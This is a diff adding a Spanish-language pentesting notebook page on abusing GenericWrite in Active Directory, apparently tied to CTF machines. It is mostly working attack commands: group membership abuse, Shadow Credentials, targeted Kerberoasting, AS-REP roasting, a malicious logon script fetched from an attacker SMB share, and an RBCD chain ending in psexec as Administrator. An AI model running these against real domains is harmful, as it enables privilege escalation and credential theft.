@@ -1,0 +1,148 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Generic Write | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="generic-write">
+          <div class="note-tabbar">
+            <span>Generic Write</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Active Directory/Escalada/ACL</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">active directory / escalada / acl</p>
+            <h2>Generic Write</h2>
+
+            <p>GenericWrite permite modificar atributos del objeto objetivo y puede derivar en SPN-jacking, Shadow Credentials, logon scripts o RBCD según el objeto.</p>
+
+            <p><span class="notebook-review-note">Aviso: <code>GenericWrite</code> sobre <code>Grupos</code> <code>AddMember</code></span></p>
+            <section class="code-card">
+              <h3>Agregar usuarios a grupos</h3>
+              <pre><code># Ataque Windows: alvaro con permisos WriteMembers puede agregar a cualquier usuario al grupo &quot;IT-Admins&quot;
+Add-DomainGroupMember -Identity &quot;IT-Admins&quot; -Members &quot;alvaro&quot;
+net group &#x27;IT-Admins&#x27; &#x27;alvaro&#x27; /add /domain
+
+# Ataque Kali: 
+bloodyAD -u &#x27;alvaro&#x27; -p &#x27;alvaro123&#x27; -d &lt;domain&gt; --host &lt;ip_dc&gt; add groupMember &#x27;IT-Admins&#x27; lidia</code></pre>
+            </section>
+            <p><span class="notebook-review-note">Aviso: <code>GenericWrite</code> sobre <code>Usuario</code> &quot;lidia&quot; <code>Shadow Credentials</code></span></p>
+            <section class="code-card">
+              <h3>Obtener hash NT para Pass the hash</h3>
+              <pre><code># Añadir una credencial alternativa basada en certificado a la cuenta objetivo para obtener hash NT
+
+# Kali
+certipy-ad shadow auto -username &#x27;alvaro&#x27;@&#x27;dominio&#x27; -password &#x27;alvaro123&#x27; -account &#x27;lidia&#x27;</code></pre>
+            </section>
+            <p><span class="notebook-review-note">Aviso: <code>GenericWrite</code>/<code>WriteSPN</code> sobre Usuario &quot;lidia&quot; <code>SPN-Jacking</code> y <code>Targeted Kerberoasting</code></span></p>
+            <section class="code-card">
+              <h3>Kerberoasting para crackear hash TGS</h3>
+              <pre><code># Configurar SPN ficticio a lidia y solicitar un ticket de servicio TGS (hash) de lidia para cracking offline
+# Windows
+# SPN Jacking: Configurar el SPN ficticio (&lt;servicio&gt;/&lt;inventado&gt;) a lidia
+Set-DomainObject -Identity &#x27;lidia&#x27; -Set @{serviceprincipalname=&#x27;http/webserver&#x27;}
+# Targeted Kerberoasting: Obtener el ticket TGS de lidia
+Get-DomainUser &#x27;lidia&#x27; | Get-DomainSPNTicket | fl
+
+# Kali
+# SPN Jacking: Configurar el SPN ficticio (&lt;servicio&gt;/&lt;inventado&gt;) a lidia
+bloodyAD --host &lt;dc_ip&gt; -d &lt;dominio&gt; -u &#x27;alvaro&#x27; -p &#x27;alvaro123&#x27; set object &#x27;lidia&#x27; servicePrincipalName -v &#x27;http/webserver&#x27;
+# Targeted Kerberoasting: Obtener el ticket TGS de lidia
+impacket-GetUserSPNs -dc-ip &lt;dc_ip&gt; &lt;dominio&gt;/&#x27;alvaro&#x27;:&#x27;alvaro123&#x27; -request-user &#x27;lidia&#x27;</code></pre>
+            </section>
+            <p><span class="notebook-review-note">Aviso: <code>WriteProperty</code> sobre <code>Usuario</code> &quot;lidia&quot; <code>AS-REP Roast</code></span></p>
+            <section class="code-card">
+              <h3>ASREP-Roasting para crackear hash TGT</h3>
+              <pre><code># Asignamos a lidia la flag DONT_REQ_PREAUTH
+bloodyAD --host &lt;dc_ip&gt; -d &lt;dominio&gt; -u &#x27;alvaro&#x27; -p &#x27;alvaro123&#x27; add uac &#x27;lidia&#x27; -f DONT_REQ_PREAUTH
+# Solicitamos el ticket TGT del usuario AS-REP Roastable
+impacket-GetNPUsers &lt;dominio&gt;/lidia -no-pass 2&gt;/dev/null</code></pre>
+            </section>
+            <p><span class="notebook-review-note">Aviso: <code>GenericWrite</code> sobre <code>Usuario</code> &quot;lidia&quot; <code>Logon Script</code></span></p>
+            <section class="code-card">
+              <h3>Asignar a lidia un script malicioso que se ejecutará cuando inicie sesión</h3>
+              <pre><code># Kali: Levantar SMB server con el payload.bat
+bloodyAD --host &lt;dc_ip&gt; -d &lt;dominio&gt; -u &#x27;alvaro&#x27; -p &#x27;alvaro123&#x27; set object &#x27;lidia&#x27; scriptpath -v &#x27;\\&lt;kali_ip&gt;\payload.bat&#x27;
+# Windows: Asignar a lidia un payload.ps1 malicioso para cuando inicie sesión
+Set-DomainObject -Identity &#x27;lidia&#x27; -SET @{scriptpath=&#x27;C:\Temp\payload.ps1&#x27;}</code></pre>
+            </section>
+            <p><span class="notebook-review-note">Aviso: <code>GenericWrite</code> sobre <code>Equipos</code></span></p>
+            <p><span class="notebook-review-note">Aviso: <code>Kerberos RBCD</code></span></p>
+            <section class="code-card">
+              <h3>alvaro GenericWrite DC$</h3>
+              <pre><code># Crear Ordenador
+impacket-addcomputer -computer-name &#x27;RUYZTZ$&#x27; -computer-pass &#x27;ruyztz7$!&#x27; -dc-ip &lt;dc_ip&gt; &#x27;&lt;domain&gt;/alvaro:alvaro123&#x27;
+
+# Delegar RBCD
+impacket-rbcd -delegate-from &#x27;RUYZTZ$&#x27; -delegate-to &#x27;DC$&#x27; -action &#x27;write&#x27; -dc-ip &lt;dc_ip&gt; &#x27;&lt;domain&gt;/alvaro:alvaro123&#x27;
+
+# Obtener TGS
+impacket-getST -spn cifs/dc.&lt;domain&gt; -impersonate Administrator -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/RUYZTZ$:&#x27;ruyztz7$!&#x27;
+
+# Conexión PSExec con Kerberos
+impacket-psexec -k &lt;hostname&gt;.&lt;domain&gt;</code></pre>
+            </section>
+            <p><span class="notebook-review-note">Aviso: <code>GenericWrite</code> sobre <code>Equipos</code>/<code>Usuarios con AddKeyCredentialLink</code></span></p>
+            <p><span class="notebook-review-note">Aviso: <code>Shadow Credentials</code> Persistencia</span></p>
+            <section class="code-card">
+              <h3>Shadow Credentials</h3>
+              <pre><code># Windows
+. .\Invoke-Whisker
+Invoke-Whisker -Command &quot;add /target:&lt;target&gt;&quot;
+# Transformas certificado y con Rubeus obtener NTLMv2
+# Máquina Outdated
+
+# Kali
+pywhisker -d &quot;&lt;domain&gt;&quot; -u &quot;&lt;user&gt;&quot; -p &quot;&lt;password&gt;&quot; --target &quot;&lt;ip&gt;&quot; --action &quot;add&quot;</code></pre>
+            </section>
+            <p><span class="notebook-review-note">Aviso: <code>GenericWrite</code> sobre<code>GPO/OU</code></span></p>
+            <p><code>Evil GPO</code></p>
+
+            <h2>Relacionados</h2>
+            <div class="notebook-related-links">
+              <a href="/writeups.html?machine=support">Support</a>
+              <a href="/writeups.html?machine=outdated">Outdated</a>
+            </div>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>ad</span>
+              <span>active_directory</span>
+              <span>escalada</span>
+              <span>acl</span>
+              <span>genericwrite</span>
+              <span>shadowcredentials</span>
+              <span>spn</span>
+              <span>rbcd</span>
+              <span>writespn</span>
+              <span>constrained_delegation</span>
+              <span>addkeycredentiallink</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
